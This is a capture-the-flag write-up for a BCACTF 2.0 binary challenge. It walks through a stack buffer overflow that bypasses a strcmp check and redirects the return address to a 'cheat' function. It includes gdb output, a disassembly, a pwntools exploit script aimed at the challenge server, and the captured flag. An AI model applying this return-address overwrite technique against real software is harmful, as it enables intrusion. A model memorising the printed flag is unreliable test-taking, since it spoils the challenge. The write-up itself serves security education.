# Advanced Math Analysis

#### Category : binex
#### Points : 200 points (127 solves)
#### Author : Edward Feng

## Challenge
The advanced course covers the same content as the non-advanced course and then some. Specifically, it also teaches some units on logic and geometry.

Now, I'm personally not the biggest fan of geometry, so I'll spare you from that. But you'll definitely need to spend some time _logic_ing this challenge out!

-   [adv-analysis.c](https://objects.bcactf.com/bcactf2/adv-analysis/adv-analysis.c)
-   [adv-analysis](https://objects.bcactf.com/bcactf2/adv-analysis/adv-analysis)
-   `nc bin.bcactf.com 49156`

## Solution
Looking at `adv-analysis.c`, we see that it is similar to [Math Analysis](https://github.com/p1xxxel/ctf-writeups/blob/main/2021/BCACTF%202.0/Math%20Analysis) in the way that there is a `cheat` function that we need to go to by overwriting the return address.

The difference is that in this case there is also a `strcmp` check for `"i pledge to not cheat"`.

#### Overwriting Return Address
So to overwrite the return address, our payload should first contain `"i pledge to not cheat"` followed by a null character(`\x00`) and padding and lastly the memory address we want.

Experimenting within gdb, this is what worked : 
```bash
gef➤  run < <(python -c "print('i pledge to not cheat'+'\x00'+'A'*50 + '123456')")
gef➤  c
Continuing.
Welcome to the more advanced math class!
Unlike the folks in regular analysis, you'll have to put in more effort.
That's because this class has a strict anti-cheating defense.
Ha, take that!
We have to maintain the BCA reputation somehow, y'know.
>
gef➤  info frame
Stack level 0, frame at 0x7fffffffe6e0:
 rip = 0x40134b in main; saved rip = 0x363534333231
 Arglist at 0x7fffffffe6d0, args:
 Locals at 0x7fffffffe6d0, Previous frame's sp is 0x7fffffffe6e0
 Saved registers:
  rbp at 0x7fffffffe6d0, rip at 0x7fffffffe6d8
```

#### Finding target memory address
As we are now able to overwrite the return address to anything we want, we need to find the memory address of the `cheat` function in order to get the flag.
```bash
gef➤  disass cheat
Dump of assembler code for function cheat:
   0x0000000000401216 <+0>:	endbr64
```
So instead of `123456` in the previous payload, we need to give `/x16/x12/x40/x00/x00/x00`

#### Getting flag
With all that information, we can write a [get_flag.py](https://github.com/p1xxxel/ctf-writeups/blob/main/2021/BCACTF%202.0/Advanced%20Math%20Analysis/get_flag.py) script to get the flag.
```python
from pwn import *
host = "bin.bcactf.com"
port = 49156
payload = 'i pledge to not cheat'+'\x00'+'A'*50 + '\x16\x12\x40\x00\x00\x00'
s = remote(host,port)
(s.recvuntil(b">"))
s.sendline(payload)
print(s.recvuntil("bcactf{")[-7:]+s.recvuntil("}"))
```
```bash
$ python3 get_flag.py
[+] Opening connection to bin.bcactf.com on port 49156: Done
b'bcactf{corresponding_parts_of_congurent_triangles_are_congruent_ie_CPCCTCPTPPTCTC}'
[*] Closed connection to bin.bcactf.com port 49156
```

flag : `bcactf{corresponding_parts_of_congurent_triangles_are_congruent_ie_CPCCTCPTPPTCTC}`